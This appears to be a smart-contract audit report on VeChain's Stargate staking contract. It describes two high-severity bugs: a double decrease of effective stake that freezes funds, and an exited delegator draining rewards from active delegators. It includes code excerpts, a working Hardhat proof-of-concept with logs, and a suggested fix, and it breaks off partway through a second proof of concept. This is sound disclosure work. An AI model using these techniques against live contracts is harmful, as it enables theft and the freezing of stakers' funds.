
| ID                                                                                                                                           | Title                                                                                                                                | Severity |
| -------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | -------- |
| [H-01](Stuck funds for the later delegators due to an edge case led to double decreasing effective stakes)                                   | Stuck funds for the later delegators due to an edge case led to double decreasing effective stakes                                   | High     |
| [H-01](Exited delegator could keep claiming rewards stealing them from active delegators which would then lead to permanent freeze of funds) | Exited delegator could keep claiming rewards stealing them from active delegators which would then lead to permanent freeze of funds | High     |
# [H-01] Stuck funds for the later delegators due to an edge case led to double decreasing effective stakes

## Brief/Intro

1. In stargate contract inorder to exit delegation while validator status is active the `requestDelegationExit` is called which call `_updatePeriodEffectiveStake` to decrease effective stakes.
2. An exiting validator status is active until exit.
Combining 1, 2 looking at this scenario
- delegator of an exiting validator calls `requestDeleagtionsExit` decreasing effective stakes
- period ends and
	- validator now is in exit state
	- delegator can redelegate by calling `delegate`
-  in delegate function it checks whether currentvalidatorstatus == exit to decrease effective stakes
So the effective stakes would be decreased again for the same delegator leaving the last delegator stuck, can't claim rewards and can't unstake and there is no emergency function to rescue funds so (stakes,rewards) would be stuck forever.

## Vulnerability Details
Since staker protocol is mocked wanted to get into some details on protocolstaker contract

First: 
	Validators has multiple cases (Doesn't exist, statusQueued, StatusActive, went offline, **SignaledExit**, Moved to StatusExit)
	
Focusing on SingaledExit status
	in this status the validator will be marked as active until period ends, and you can know he has signaled exit by looking at **validatorExitBlock** it will reflect the block once requested to exit.

In stargate contract validators that signaled exit is treated as active so for the delegator to redelgate to another validator he should call `requestDelegationExit` function
once functino called it remove the delegation from validator effective stakes

[updateperiodeffectivestakes](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L567-L569)
```solidity
File: Stargate.sol
523:     function requestDelegationExit(
// CODE
567:         // decrease the effective stake
568:         _updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
```

Moving forward until period ends and that the delegator can withdraw from the validator or redelgate to another validator at this time 
- **Validator status has changed to exited**

When the delegator choose to redelgate he will enter this block 
[current validator is exited](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L396-L414)

```solidity
File: Stargate.sol
338:     function _delegate(StargateStorage storage $, uint256 _tokenId, address _validator) private {
// CODE
398:             if (
399:                 currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
400:                 status == DelegationStatus.PENDING
401:             ) {
402:                 // get the completed periods of the previous validator
403:                 (, , , uint32 oldCompletedPeriods) = $
404:                     .protocolStakerContract
405:                     .getValidationPeriodDetails(currentValidator);
406:                 // decrease the effective stake of the previous validator
407:@>               _updatePeriodEffectiveStake(
408:                     $,
409:                     currentValidator,
410:                     _tokenId,
411:                     oldCompletedPeriods + 2,
412:                     false // decrease
413:                 );
414:             }
```

**Decreasing the effective stakes twice** 
1. once in the past period when validator was active.
2. in delegate (exiting validator status is now exited ).

For the next delegators to unstake or to redelegate they will have their funds stuck due to underflow in claim rewards calculations which always called in
- delegate
- unstake

looking at implementation of [_updateperiodeffectivestake](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L1044-L1064)
```solidity
File: Stargate.sol
1044:     function _updatePeriodEffectiveStake(
1045:         StargateStorage storage $,
1046:         address _validator,
1047:         uint256 _tokenId,
1048:         uint32 _period,
1049:         bool _isIncrease
1050:     ) private {
1051:         // calculate the effective stake
1052:         uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);
1053: 
1054:         // get the current effective stake
1055:         uint256 currentValue = $.delegatorsEffectiveStake[_validator].upperLookup(_period);
1056: 
1057:         // calculate the updated effective stake
1058:@>       uint256 updatedValue = _isIncrease
1059:             ? currentValue + effectiveStake
1060:             : currentValue - effectiveStake;
1061: 
1062:         // push the updated effective stake
1063:         $.delegatorsEffectiveStake[_validator].push(_period, SafeCast.toUint224(updatedValue));
1064:     }
```

`delegatorsEffectiveStake` variable is updated to the latest value either adding or removing effective stakes (in our case removing)

This parameter is called in `_claimableRewardsForPeriod` called by`_claimableRewards` called by `_claimRewards` which always being called in 
- unstake
- delegate
## Impact Details
- permanent freezing of delegator funds 
	- delegator can't redelegate nor unstake and there funds is stuck
- permanet freezing of delegators rewards
	- rewards can't be claimed due the underflow in 
## References
[claim inside unstake](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L303-L304)
[claim inside delegate](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L438-L439)

[decrease effective stakes in delegate](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L407-L413)
[decrease effective stakes in requestDelegationExit](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L567-L569)


## Proof of Concept


> [!NOTE]
If you already have good understanding of thor staking protocol flow and its validator status you can skip this the next POC (they are just to confirm parts changed in protocolstakermock) the actual poc start under ## POC 

1st you can check [validator exit proccess](https://docs.stargate.vechain.org/hayabusa/overview/validators#validator-exit-process) explaining the change from active status to exit status

2nd as of that protocolstaker is a mock contract wanted to confirm to you the behavior that the delegationid will always be directing to the validator 
you can download [thor prtocol](https://github.com/vechain/thor) and add this test in `delegation_test.go` 
```go
func Test_Delegation_Mapping_Persistence(t *testing.T) {
	// Copy pattern from existing working test
	staker, validators := newDelegationStaker(t)
	validator := validators[0]
	stake := delegationStake()
	
	// Step 1: Add delegation
	id, err := staker.AddDelegation(validator.ID, stake, 255, 10)
	assert.NoError(t, err)
	
	del1, _, err := staker.GetDelegation(id)
	assert.NoError(t, err)
	t.Logf("INITIAL: Validator=%s, Stake=%d, LastIteration=%v", 
		del1.Validation.String(), del1.Stake, del1.LastIteration)
	
	// Step 2: Activate delegation
	_, err = staker.Housekeep(validator.Period)
	assert.NoError(t, err)
	
	// Step 3: Signal exit
	err = staker.SignalDelegationExit(id, validator.Period)
	assert.NoError(t, err)
	
	del2, _, err := staker.GetDelegation(id)
	assert.NoError(t, err)
	t.Logf("AFTER SIGNAL: Validator=%s, Stake=%d, LastIteration=%v", 
		del2.Validation.String(), del2.Stake, del2.LastIteration)
	
	// Step 4: Complete exit period
	_, err = staker.Housekeep(validator.Period * 2)
	assert.NoError(t, err)
	
	// Step 5: Withdraw
	amount, err := staker.WithdrawDelegation(id, validator.Period*2)
	assert.NoError(t, err)
	t.Logf("WITHDRAWN: %d VET", amount)
	
	del3, _, err := staker.GetDelegation(id)
	assert.NoError(t, err)
	t.Logf("AFTER WITHDRAW: Validator=%s, Stake=%d, LastIteration=%v", 
		del3.Validation.String(), del3.Stake, del3.LastIteration)
	
	// Verify mapping still exists
	assert.NotNil(t, del3)
	assert.Equal(t, validator.ID, del3.Validation)
	assert.Equal(t, uint64(0), del3.Stake)
	assert.NotNil(t, del3.LastIteration)
	t.Logf("✅ MAPPING PERSISTS AFTER WITHDRAWAL")
}
```

Looking at the logs you can confirm that: `delegationid` won't be remove after exit and will direct to the data **validator**
```sh

=== RUN   Test_Delegation_Mapping_Persistence
    
/vechain/thor/builtin/staker/delegations_test.go:765: INITIAL: Validator=0xd24bb0aa2640cca1255148c5e3a89f7ce87adc64, Stake=10000, LastIteration=<nil>
    
/vechain/thor/builtin/staker/delegations_test.go:778: AFTER SIGNAL: Validator=0xd24bb0aa2640cca1255148c5e3a89f7ce87adc64, Stake=10000, LastIteration=0xc000a0d0c0

/vechain/thor/builtin/staker/delegations_test.go:788: WITHDRAWN: 10000 VET

/vechain/thor/builtin/staker/delegations_test.go:792: AFTER WITHDRAW: Validator=0xd24bb0aa2640cca1255148c5e3a89f7ce87adc64, Stake=0, LastIteration=0xc000a0dba0

/vechain/thor/builtin/staker/delegations_test.go:800: ✅ MAPPING PERSISTS AFTER WITHDRAWAL
--- PASS: Test_Delegation_Mapping_Persistence (0.01s)
PASS
```

Also confirming that an exiting validator will still be in active state and will just have exitblock overwritten

add this test in `delegation_test.go`  and run it
```go
func Test_Validator_Exit_Status_Logging(t *testing.T) {
	staker, validators := newDelegationStaker(t)

	validator := validators[0]
	stake := delegationStake()

	// Add a delegation to the validator
	id, err := staker.AddDelegation(validator.ID, stake, 255, 10)
	assert.NoError(t, err)

	// Activate the delegation via housekeeping
	_, err = staker.Housekeep(validator.Period)
	assert.NoError(t, err)

	// Retrieve initial validator status (should be active)
	validation, err := staker.GetValidation(validator.ID)
	assert.NoError(t, err)
	t.Logf("Initial validator status: %v", validation.Status)

	// Signal the validator to exit
	assert.NoError(t, staker.SignalExit(validator.ID, validator.Endorser, validator.Period))

	// Log status during the exit period (after signaling but before exit completes)
	validation, err = staker.GetValidation(validator.ID)
	assert.NoError(t, err)
	t.Logf("During exit period: Validator status: %v", validation.Status)

	// Complete the exit through housekeeping
	_, err = staker.Housekeep(validator.Period * 2)
	assert.NoError(t, err)

	// Log status after the exit period ends
	validation, err = staker.GetValidation(validator.ID)
	assert.NoError(t, err)
	t.Logf("After exit period: Validator status: %v", validation.Status)

	// Withdraw the delegation to clean up
	amount, err := staker.WithdrawDelegation(id, validator.Period*2 + 10)
	assert.NoError(t, err)
	assert.Equal(t, stake, amount)
}
```

Logs:
```sh
=== RUN   Test_Validator_Exit_Status_Logging

/vechain/thor/builtin/staker/delegations_test.go:820: Initial validator status: 2
    
/vechain/thor/builtin/staker/delegations_test.go:828: During exit period: Validator status: 2
    
/vechain/thor/builtin/staker/delegations_test.go:837: After exit period: Validator status: 3
--- PASS: Test_Validator_Exit_Status_Logging (0.01s)
```



___

## POC

Create a new `local.ts` inside `pakcages/config/` with this data
```ts
import { AppConfig } from ".";

const config: AppConfig = {
  environment: "local",
  basePath: "http://localhost:3000",
  ipfsPinningService: "https://api.gateway-proxy.vechain.org/api/v1/pinning/pinFileToIPFS",
  ipfsFetchingService: "https://api.gateway-proxy.vechain.org/ipfs",
  legacyNodesContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateNFTContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateDelegationContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  nodeManagementContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateContractAddress: "0x00000000000000000000000000005374616B6572",
  protocolStakerContractAddress: "0x00000000000000000000000000005374616B6572",
  protocolParamsContractAddress: "0x0000000000000000000000000000506172616d73",
  indexerUrl: "http://localhost:8080/api/v1",
  nodeUrl: "http://localhost:8669",
  network: {
    id: "solo",
    name: "solo",
    type: "solo",
    defaultNet: true,
    urls: [
      "http://localhost:8669"
    ],
    explorerUrl: "https://explore-testnet.vechain.org",
    blockTime: 10000,
    genesis: {
      id: "0x0000000089970f535c92d8f2151346f002755b4cf6f7fb4b731317fc6df8ee51"
    }
  },
  cyclePeriods: [
    { value: 18, label: "3 minutes" },
    { value: 180, label: "30 minutes" },
    { value: 8640, label: "1 day" },
  ],
}
export default config;
```


Create a new file you can name it `DelegationExitBug.test.ts`
paste this 
```ts

import { expect } from "chai";
import { ethers } from "hardhat";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../typechain-types";
import { getOrDeployContracts } from "../../test/helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers as hardhatEthers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { TransactionResponse } from "ethers";
import { log } from "../../scripts/helpers/log";

describe("Delegation Exit Bug POC", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let user1: HardhatEthersSigner;
    let user2: HardhatEthersSigner;
    let user3: HardhatEthersSigner; // Second validator
    let tx: TransactionResponse;
    let vthoTokenContract: MyERC20;

    const LEVEL_ID = 1;

    const VALIDATOR_STATUS_UNKNOWN = 0;
    const VALIDATOR_STATUS_QUEUED = 1;
    const VALIDATOR_STATUS_ACTIVE = 2;
    const VALIDATOR_STATUS_EXITED = 3;

    const DELEGATION_STATUS_NONE = 0;
    const DELEGATION_STATUS_PENDING = 1;
    const DELEGATION_STATUS_ACTIVE = 2;
    const DELEGATION_STATUS_EXITED = 3;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await hardhatEthers.getSigners();

        // Deploy protocol staker mock
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        // Deploy stargateNFT mock
        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        // Deploy VTHO token to the energy address
        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(
            deployer.address,
            deployer.address
        );
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        // Deploy legacy nodes mock
        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        // Deploy contracts
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);
        user1 = contracts.otherAccounts[0];
        user2 = contracts.otherAccounts[1];
        user3 = contracts.otherAccounts[2]; // Second validator

        // add default validator
        tx = await protocolStakerMock.addValidation(user1.address, 120);
        await tx.wait();

        // set the stargate contract address so it can be used for
        // withdrawals and rewards
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        // set the validator status to active by default so it can be delegated to
        tx = await protocolStakerMock.helper__setValidatorStatus(
            user1.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();

        // add second validator
        tx = await protocolStakerMock.addValidation(user2.address, 120);
        await tx.wait();
        // set the stargate contract address so it can be used for
        // withdrawals and rewards
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(
            user2.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();

        // add third validator (different one)
        tx = await protocolStakerMock.addValidation(user3.address, 120);
        await tx.wait();
        // set the stargate contract address so it can be used for
        // withdrawals and rewards
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(
            user3.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();

        // set the mock values in the stargateNFTMock contract
        // set get level response
        tx = await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "Strength",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 150,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });
        await tx.wait();

        // set get token response
        tx = await stargateNFTMock.helper__setToken({
            tokenId: 10000,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: ethers.parseEther("1"),
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();

        // set the legacy nodes mock
        tx = await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);
        await tx.wait();

        // mint some VTHO to the stargate contract so it can reward users
        tx = await vthoTokenContract
            .connect(deployer)
            .mint(stargateContract.target, ethers.parseEther("50000000"));
        await tx.wait();

        // Fund the users and contract with VET for staking
        await ethers.provider.send("hardhat_setBalance", [user1.address, "0x" + (10 ** 18).toString(16)]); // 1 VET
        await ethers.provider.send("hardhat_setBalance", [user2.address, "0x" + (10 ** 18).toString(16)]); // 1 VET
        await ethers.provider.send("hardhat_setBalance", [stargateContract.target, "0x" + (10 ** 20).toString(16)]); // 100 VET
    });

    it("POC: user2 unstake reverts after user1 delegation exit and re-delegation", async () => {
        const validatorAddress = user1.address; // user1 acts as validator A
        const differentValidator = user3.address; // user3 acts as validator B (different validator)

        // Mint tokens for user1 and user2
        tx = await stargateNFTMock.mint(LEVEL_ID, user1.address);
        await tx.wait();
        const tokenId1 = await stargateNFTMock.getCurrentTokenId();

        tx = await stargateNFTMock.mint(LEVEL_ID, user2.address);
        await tx.wait();
        const tokenId2 = await stargateNFTMock.getCurrentTokenId();

        // Step 1: user1 delegates to active validator (existing validator)
        console.log("\n=== Step 1: user1 delegates to active validator ===");
        tx = await stargateContract.connect(user1).delegate(tokenId1, validatorAddress);
        await tx.wait();

        // Verify delegation is pending
        let delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_PENDING);
        console.log("user1 delegation status:", delegationStatus1.toString(), "(PENDING)");

        // Log effective stake after delegation
        const [, , , currentPeriods1] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStake1 = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods1 + 2n);
        console.log("Validator A effective stake after user1 delegation increased:", String(effectiveStake1));

        // Step 2: user2 delegates to the same validator that user1 delegated to
        console.log("\n=== Step 2: user2 delegates to same validator ===");
        tx = await stargateContract.connect(user2).delegate(tokenId2, validatorAddress);
        await tx.wait();

        // Verify delegation is pending
        let delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);
        expect(delegationStatus2).to.equal(DELEGATION_STATUS_PENDING);
        console.log("user2 delegation status:", delegationStatus2.toString(), "(PENDING)");

        // Log effective stake after second delegation
        const [, , , currentPeriods2] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStake2 = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods2 + 2n);
        console.log("Validator A effective stake after user2 delegation increased:", String(effectiveStake2));

        // Fast-forward to period 2: delegations become active
        // But wait for period 3 so user2 can unstake after period end
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 3);
        await tx.wait();

        // Verify both delegations are now active
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_ACTIVE);
        expect(delegationStatus2).to.equal(DELEGATION_STATUS_ACTIVE);
        console.log("user1 delegation status:", delegationStatus1.toString(), "(ACTIVE)");
        console.log("user2 delegation status:", delegationStatus2.toString(), "(ACTIVE)");

        // Step 3: user1 calls requestDelegationExit (period 2, user requests exit)
        // Then validator signals exit in response
        console.log("\n=== Step 3: user1 requests delegation exit, validator signals exit ===");
        tx = await stargateContract.connect(user1).requestDelegationExit(tokenId1);
        await tx.wait();
        console.log("user1 requested delegation exit");

        // Validator signals exit after receiving delegation exit request
        tx = await protocolStakerMock.signalExit(validatorAddress);
        await tx.wait();
        console.log("validator A signaled exit");

        // Verify user1 has requested exit but delegation is still active (validator still active)
        const hasRequestedExit1 = await stargateContract.hasRequestedExit(tokenId1);
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(hasRequestedExit1).to.be.true;
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_ACTIVE); // Still ACTIVE
        console.log("user1 hasRequestedExit:", hasRequestedExit1);
        console.log("user1 delegation status:", delegationStatus1.toString(), "(ACTIVE)");

        // Log effective stake after delegation exit request
        const [, , , currentPeriods3] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStakeAfterExitReq = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods3 + 2n);
        console.log("Validator A effective stake after user1 delegation exit request decreases:", String(effectiveStakeAfterExitReq));

        // Step 4: Period 3 ends and user1's delegation becomes exited - user1 re-delegates to different validator
        console.log("\n=== Step 4: Period 3 ends - user1's delegation exits, then re-delegates to different validator ===");

        // Advance to period 3: user1's delegation becomes exited and validator should now be EXITED
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validatorAddress, 3);
        await tx.wait();
        // Since validator signaled exit, it should now be EXITED status after period advance
        tx = await protocolStakerMock.helper__setValidatorStatus(validatorAddress, VALIDATOR_STATUS_EXITED);
        await tx.wait();

        // Verify user1's delegation is now exited
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_EXITED);
        console.log("user1 delegation status after period end:", delegationStatus1.toString(), "(EXITED)");

        // Verify validator A is now EXITED before re-delegating
        const validatorADetails = await protocolStakerMock.getValidation(validatorAddress);
        console.log("Validator A validation details:", validatorADetails);
        const [, , , , validatorAStatus] = validatorADetails;
        console.log("Validator A status check - current:", validatorAStatus, "expected:", VALIDATOR_STATUS_EXITED);
        expect(validatorAStatus).to.equal(VALIDATOR_STATUS_EXITED);
        console.log("Validator A status confirmed as EXITED before re-delegation");

        // user1 delegates again to a DIFFERENT validator (this triggers the double decrease bug)
        tx = await stargateContract.connect(user1).delegate(tokenId1, differentValidator);
        await tx.wait();

        // Verify user1's new delegation is pending
        delegationStatus1 = await stargateContract.getDelegationStatus(tokenId1);
        expect(delegationStatus1).to.equal(DELEGATION_STATUS_PENDING);
        console.log("user1 new delegation status:", delegationStatus1.toString(), "(PENDING)");

        // Log effective stake after re-delegation (both validators)
        const [, , , currentPeriods4A] = await protocolStakerMock.getValidationPeriodDetails(validatorAddress);
        const effectiveStakeAfterReDelegationA = await stargateContract.getDelegatorsEffectiveStake(validatorAddress, currentPeriods4A + 2n);
        const [, , , currentPeriods4B] = await protocolStakerMock.getValidationPeriodDetails(differentValidator);
        const effectiveStakeAfterReDelegationB = await stargateContract.getDelegatorsEffectiveStake(differentValidator, currentPeriods4B + 2n);
        console.log("Validator A effective stake after user1 re-delegation decreases again as validator is in exit state:", String(effectiveStakeAfterReDelegationA));
        console.log("Validator B effective stake after user1 re-delegation increase:", String(effectiveStakeAfterReDelegationB));

        // Step 5: user2 requests to unstake but the transaction reverts
        console.log("\n=== Step 5: user2 attempts to unstake ===");

        // Check user2's delegation status before unstaking
        delegationStatus2 = await stargateContract.getDelegationStatus(tokenId2);
        console.log("user2 delegation status before unstake:", delegationStatus2.toString());

        // Check if user2's delegation is locked
        const delegation2 = await stargateContract.getDelegationDetails(tokenId2);
        console.log("user2 delegation isLocked:", delegation2.isLocked);
        console.log("user2 delegation endPeriod:", delegation2.endPeriod);

        // user2 should be able to unstake since delegation is still active but not locked after period end
        // However, there might be an issue with the state after user1's re-delegation
        try {
            tx = await stargateContract.connect(user2).unstake(tokenId2);
            await tx.wait();
            console.log("✅ user2 successfully unstaked");
        } catch (error: any) {
            console.log("❌ user2 unstake failed:", error.message);
        }

    });
});

```


you can run the test with this command

`VITE_APP_ENV=local npx hardhat test test/integration/DelegationExitBug.test.ts`

You can follow along with the test and the logs tracking **validator effective stake** and the error message appearing at the end when last delegator try to unstake (Arithmetic operation overflowed outside of an unchecked block)

Logs:
```sh
  Delegation Exit Bug POC

=== Step 1: user1 delegates to active validator ===
user1 delegation status: 1 (PENDING)
Validator A effective stake after user1 delegation increased: 1500000000000000000

=== Step 2: user2 delegates to same validator ===
user2 delegation status: 1 (PENDING)
Validator A effective stake after user2 delegation increased: 3000000000000000000
user1 delegation status: 2 (ACTIVE)
user2 delegation status: 2 (ACTIVE)

=== Step 3: user1 requests delegation exit, validator signals exit ===
user1 requested delegation exit
validator A signaled exit
user1 hasRequestedExit: true
user1 delegation status: 2 (ACTIVE)
Validator A effective stake after user1 delegation exit request decreases: 1500000000000000000

=== Step 4: Period 3 ends - user1's delegation exits, then re-delegates to different validator ===
user1 delegation status after period end: 3 (EXITED)
Validator A validation details: Result(6) [
  '0x0000000000000000000000000000000000000000',
  0n,
  0n,
  0n,
  3n,
  0n
]
Validator A status check - current: 3n expected: 3
Validator A status confirmed as EXITED before re-delegation
user1 new delegation status: 1 (PENDING)
Validator A effective stake after user1 re-delegation decreases again as validator is in exit state: 0
Validator B effective stake after user1 re-delegation increase: 1500000000000000000

=== Step 5: user2 attempts to unstake ===
user2 delegation status before unstake: 3
user2 delegation isLocked: false
user2 delegation endPeriod: 4294967295n
❌ user2 unstake failed: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation overflowed outside of an unchecked block)
    ✔ POC: user2 unstake reverts after user1 delegation exit and re-delegation (112ms)


  1 passing (1s)

```







## comments


```diff
--            if (
--                currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
--                status == DelegationStatus.PENDING


++            if (
++                (currentValidatorStatus == VALIDATOR_STATUS_EXITED && delegationEndPeriod >= validatorExitBlock) ||
++                status == DelegationStatus.PENDING
```



# [H-02] Exited delegator could keep claiming rewards stealing them from active delegators which would then lead to permanent freeze of funds

## Brief/Intro

For a delegator to exit delegation from Active validator he has to call `requestDelegationExit`
which directly remove this delegator stakes from effictivestakes through `_updatePeriodEffectiveStake` function

In the next period the delegator can unstake or redelegate how ever he didn't and just sat down doing nothing while the validator keeps working and completes periods he can steal rewards from effective stakes by calling claimrewards multiple times **1st would be capped at the endperiod(time requested to exit)** then from now on it will keep stealing the rewards from the current active stakes.

## Vulnerability Details

scenario in simple term:
1. delegator delegate to active validator.
2. Time passes and delegator delegate is now active and claim rewards.
3. In the working period delegator decided to exit delegation calling `requestDelegationExit`.
4. The delegator stakes got removed from effective stakes direcetly as of the call to `_updatePeriodEffectiveStake` inside `requestdelegationexit` without the deleting delegtionid as validator is active.

[requestDelegationExit](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L567-L569)
```solidity
File: Stargate.sol
523:     function requestDelegationExit(
// CODE
567:         // decrease the effective stake
568:@>       _updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
```

5. Time passes and delegator didn't exit and did nothing. 
6. After validator completed multiple periods Delegator called claimrewrads.
	inside claimrewards it first check claimable periods
	[_claimRewards](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L790-L791)
```solidity
File: Stargate.sol
789:     function _claimRewards(StargateStorage storage $, uint256 _tokenId) private {
790:@>       (uint32 firstClaimablePeriod, uint32 lastClaimablePeriod) = _claimableDelegationPeriods(
791:             $,
792:             _tokenId
793:         );
```

5. 1st time claim rewards would be capped at endperiod which was when requested for exit.
[claimable delegation periods](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L963-L973)
```solidity
function _claimableDelegationPeriods(
// CODE
963:         // check first for delegations that ended
964:         // endPeriod is not max if the delegation is exited or requested to exit
965:         // if the endPeriod is before the current validator period, it means the delegation ended
966:         // because if its equal it means they requested to exit but the current period is not over yet
967:         if (
968:             endPeriod != type(uint32).max &&
969:             endPeriod < currentValidatorPeriod &&
970:@>           endPeriod > nextClaimablePeriod
971:         ) {
972:             return (nextClaimablePeriod, endPeriod);
973:         }
```

5. From now on this validator can steal rewards from current effective ones as the state that `endperiod > nextclaimableperiod` will never meet.
6. This will leave the contract in dept due to the steal and moreover would block delegators funds as that claimrewards is used in unstake function.
so for example if there were 2 delegator sharing the rewards each get 50% 
after the 1st exit the current delegator should receive 100% but the exited delegator would be the one stealing this amounts.
## Impact Details

- Stealing of effective delegators rewards.
- Later leads to freeze of funds due to unstake depending on `claimrewards` function.
## References

[claimable delegation periods](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L963-L973)

[_claimRewards](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L790-L791)

[changing lastclaimedperiod](https://github.com/vechain/stargate-contracts/blob/877f294a132bf3fd9b51821c5f58b9f9e91c60c1/packages/contracts/contracts/Stargate.sol#L815-L816)



## Proof of Concept


Create a new `local.ts` inside `pakcages/config/` with this data
```ts
import { AppConfig } from ".";

const config: AppConfig = {
  environment: "local",
  basePath: "http://localhost:3000",
  ipfsPinningService: "https://api.gateway-proxy.vechain.org/api/v1/pinning/pinFileToIPFS",
  ipfsFetchingService: "https://api.gateway-proxy.vechain.org/ipfs",
  legacyNodesContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateNFTContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateDelegationContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  nodeManagementContractAddress: "0x45d5CA3f295ad8BCa291cC4ecd33382DE40E4FAc",
  stargateContractAddress: "0x00000000000000000000000000005374616B6572",
  protocolStakerContractAddress: "0x00000000000000000000000000005374616B6572",
  protocolParamsContractAddress: "0x0000000000000000000000000000506172616d73",
  indexerUrl: "http://localhost:8080/api/v1",
